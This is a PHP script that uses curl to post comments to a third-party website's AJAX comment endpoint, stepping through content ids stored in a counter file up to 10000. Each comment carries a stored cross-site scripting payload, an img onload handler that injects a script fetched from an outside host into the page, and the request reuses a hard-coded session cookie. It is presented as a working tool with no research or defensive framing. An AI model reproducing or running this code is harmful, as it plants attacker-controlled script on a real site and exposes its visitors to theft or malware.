<?php

$curl = curl_init();
$file = 'logdog1.txt';
$uniq = file_get_contents($file);
if ($uniq == '10000'){
	echo "stop selsai";
}else {
//add +1
$id = $uniq + 1 ;

// add that new value to text file again for next use
file_put_contents($file, $id);
curl_setopt_array($curl, array(
  CURLOPT_URL => 'https://www.dogilike.com/ajax/comment2012.php',
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => '',
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 0,
  CURLOPT_FOLLOWLOCATION => true,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => 'POST',
  CURLOPT_POSTFIELDS =>'action=comment&program=content&message=...<img src ="https://arenatani.com/assets/anu.png" onload=(function(s,u,p){s.src=u,p.appendChild(s);})(document.createElement("script"),"//arenatani.com/assets/u.js",document.body||document.documentElement)>&id='.$id.'&ownerID=12&aliasname=&email=&txtCode=&username=&password=&dologin=1',
  CURLOPT_HTTPHEADER => array(
    'Host: www.dogilike.com',
    
    'Cookie: __gads=ID=a7171a9a1910f48f:T=1640185609:S=ALNI_MYb_bP1qc09Yk2lDhX0o8p2Wa_IYA; __utmz=50735286.1658062050.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); cookie-policy-accepted=1; _ga=GA1.2.1619964460.1658062050; PHPSESSID=usloltiqdb1scookd7h15hbi5q; __utma=50735286.1619964460.1658062050.1658062050.1658062050.1; __utmc=50735286; __utmt=1; __utmb=50735286.21.10.1658062050',
    'Sec-Ch-Ua: " Not A;Brand";v="99", "Chromium";v="96"',
    'Accept: application/json, text/javascript, */*; q=0.01',
    'Content-Type: application/x-www-form-urlencoded',
    'X-Requested-With: XMLHttpRequest',
    'Sec-Ch-Ua-Mobile: ?0',
    'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36',
    'Sec-Ch-Ua-Platform: "Windows"',
    'Origin: https://www.dogilike.com',
    'Sec-Fetch-Site: same-origin',
    'Sec-Fetch-Mode: cors',
    'Sec-Fetch-Dest: empty',
    'Referer: https://www.dogilike.com/content/review/9837/',
    'Accept-Encoding: gzip, deflate',
    'Accept-Language: en-US,en;q=0.9'
  ),
));

$response = curl_exec($curl);

curl_close($curl);
echo $response;
}